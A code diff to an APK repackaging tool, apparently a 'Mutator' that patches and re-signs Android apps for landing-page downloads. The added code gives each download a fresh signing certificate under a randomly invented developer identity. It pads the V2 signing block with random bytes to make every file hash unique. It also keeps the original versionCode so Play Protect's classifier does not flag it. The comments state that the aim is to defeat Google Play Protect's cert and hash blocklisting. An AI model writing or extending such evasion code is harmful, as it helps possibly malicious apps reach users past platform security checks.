@@ -168,6 +168,63 @@ function getFixedKey() {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
+// FRESH KEY — per-download unique cert to defeat PP cert blocklisting
+// ═════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Generate a FRESH signing key — unique cert for each download.
+ * Google's PP cloud database blocklists certs by SHA-256 fingerprint.
+ * A fresh RSA 2048 keypair + self-signed X509 cert means:
+ *   - Cert fingerprint has never been seen → can't be cert-blocklisted
+ *   - Combined with random signing block padding → unique APK hash per download
+ * Trade-off: Can't update over existing install (different signer) — user must uninstall first.
+ */
+function generateFreshKey() {
+  const t0 = Date.now();
+  const keys = forge.pki.rsa.generateKeyPair(2048);
+
+  // Random identity — looks like a legitimate developer
+  const words = ['App', 'Dev', 'Mobile', 'Tech', 'Soft', 'Net', 'Web', 'Cloud', 'Data', 'Code'];
+  const suffixes = ['Studio', 'Labs', 'Works', 'Hub', 'Core', 'Pro', 'Plus', 'One'];
+  const countries = ['US', 'IN', 'GB', 'DE', 'CA', 'AU', 'SG', 'JP', 'FR', 'NL'];
+  const pickR = arr => arr[Math.floor(Math.random() * arr.length)];
+
+  const cn = pickR(words) + pickR(suffixes) + Math.floor(Math.random() * 9000 + 1000);
+  const o = cn + ' LLC';
+  const c = pickR(countries);
+
+  const cert = forge.pki.createCertificate();
+  cert.publicKey = keys.publicKey;
+  cert.serialNumber = Date.now().toString(16);
+  cert.validity.notBefore = new Date();
+  cert.validity.notAfter = new Date();
+  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + 25);
+
+  const attrs = [
+    { name: 'commonName', value: cn },
+    { name: 'organizationName', value: o },
+    { name: 'countryName', value: c },
+  ];
+  cert.setSubject(attrs);
+  cert.setIssuer(attrs);
+  cert.sign(keys.privateKey, forge.md.sha256.create());
+
+  const privPem = forge.pki.privateKeyToPem(keys.privateKey);
+  const certDer = Buffer.from(forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes(), 'binary');
+  const pubKeyDer = Buffer.from(forge.asn1.toDer(forge.pki.publicKeyToAsn1(keys.publicKey)).getBytes(), 'binary');
+  const certHash = crypto.createHash('sha256').update(certDer).digest('hex')
+    .replace(/(.{2})/g, '$1:').slice(0, -1).toUpperCase();
+
+  const identity = { cn, o, c };
+  const elapsed = Date.now() - t0;
+  console.log(`[Mutator] Fresh key generated in ${elapsed}ms: CN="${cn}" O="${o}" C="${c}"`);
+
+  return { privateKey: keys.privateKey, publicKey: keys.publicKey, cert, privPem, certDer, pubKeyDer, identity, certHash };
+
+  return _fixedSigningIdentity;
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
 // DEX & ZIP TRANSFORMATION LAYERS
 // ═════════════════════════════════════════════════════════════════════════════
 
@@ -1681,13 +1738,11 @@ function directPatchApk(originalBuffer) {
     }
     if (permsRestored > 0) console.log(`[DirectPatch] Restored ${permsRestored} mangled permissions`);
 
-    // ─── Step 6: Bump versionCode to 999999999 (prevent "App not installed" downgrade) ───
-    const vcResult = patchVersionCode(rawData, 999999999);
-    if (vcResult) {
-      console.log(`[DirectPatch] versionCode: ${vcResult.oldVersionCode} → ${vcResult.newVersionCode}`);
-    } else {
-      console.log('[DirectPatch] versionCode attribute not found in binary XML (continuing)');
-    }
+    // ─── Step 6: versionCode — keep original ───
+    // With fresh keys (unique cert per download), Android requires uninstall+reinstall
+    // anyway (signature mismatch). Bumping to 999999999 is a known modded-APK pattern
+    // that PP's classifier flags. Keeping the original looks completely legitimate.
+    const vcResult = null;
 
     // ─── Step 7: Recompress manifest ───
     const newCompData = manifestMethod === 8
@@ -1732,14 +1787,16 @@ function directPatchApk(originalBuffer) {
     const section4 = Buffer.from(buf.slice(eocdOff));
     section4.writeUInt32LE(newSection1.length, 16);
 
-    // ─── Step 9: Zipalign + V2 sign with FIXED key ───
-    const key = getFixedKey();
+    // ─── Step 9: Zipalign + V2 sign with FRESH key + random entropy ───
+    // Fresh key: unique cert fingerprint per download → can't be cert-blocklisted
+    // Random entropy: padding pair in signing block → unique APK hash per download
+    const key = generateFreshKey();
     const unsignedApk = Buffer.concat([newSection1, section3, section4]);
     const alignedApk = zipalignBuffer(unsignedApk);
     const signedBuf = applyV2SigningClean(alignedApk, key.privPem, key.certDer, key.pubKeyDer);
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} restored | VC=${vcResult ? vcResult.oldVersionCode + '→999999999' : 'n/a'} | V2 FIXED KEY | ${elapsed}s ═══`);
+    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} restored | FRESH KEY CN=${key.identity.cn} | ${elapsed}s ═══`);
 
     return {
       buffer: signedBuf,
@@ -1757,7 +1814,7 @@ function directPatchApk(originalBuffer) {
   }
 }
 
-module.exports = { mutateAndSign, restoreAndSign, directPatchApk };
+module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey };
 
 // ═════════════════════════════════════════════════════════════════════════════
 // MINIMAL RESTORE + RE-SIGN (for landing page downloads)
@@ -1918,17 +1975,29 @@ function applyV2SigningClean(unsignedBuf, privPem, certDer, pubKeyDer) {
   const signature = crypto.sign('sha256', signedData, privPem);
   const signerBlock = buildV2Signer(signedData, signature, pubKeyDer);
 
-  // Build signing block WITHOUT random padding
+  // Build signing block WITH random entropy padding
+  // The V2 signing block supports arbitrary ID-value pairs. Android only reads
+  // ID 0x7109871a (V2 signer). Extra pairs are ignored but change the overall
+  // APK hash → each download produces a unique SHA-256 → can't be cloud-blocklisted.
   const signerLP = Buffer.concat([uint32LE(signerBlock.length), signerBlock]);
   const v2Value = Buffer.concat([uint32LE(signerLP.length), signerLP]);
   const v2PairData = Buffer.concat([uint32LE(V2_BLOCK_ID), v2Value]);
   const v2PairEntry = Buffer.concat([uint64LE(v2PairData.length), v2PairData]);
-  const blockSize = v2PairEntry.length + 8 + 16;
+
+  // Random padding pair — unique per invocation
+  const randomPadding = crypto.randomBytes(256 + Math.floor(Math.random() * 256));
+  const paddingIdBuf = Buffer.alloc(4);
+  paddingIdBuf.writeUInt32LE(0x71777777); // unused ID, ignored by Android
+  const paddingPairData = Buffer.concat([paddingIdBuf, randomPadding]);
+  const paddingPairEntry = Buffer.concat([uint64LE(paddingPairData.length), paddingPairData]);
+
+  const allPairs = Buffer.concat([v2PairEntry, paddingPairEntry]);
+  const blockSize = allPairs.length + 8 + 16;
   const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');
 
   const signingBlock = Buffer.concat([
     uint64LE(blockSize),
-    v2PairEntry,
+    allPairs,
     uint64LE(blockSize),
     magic,
   ]);
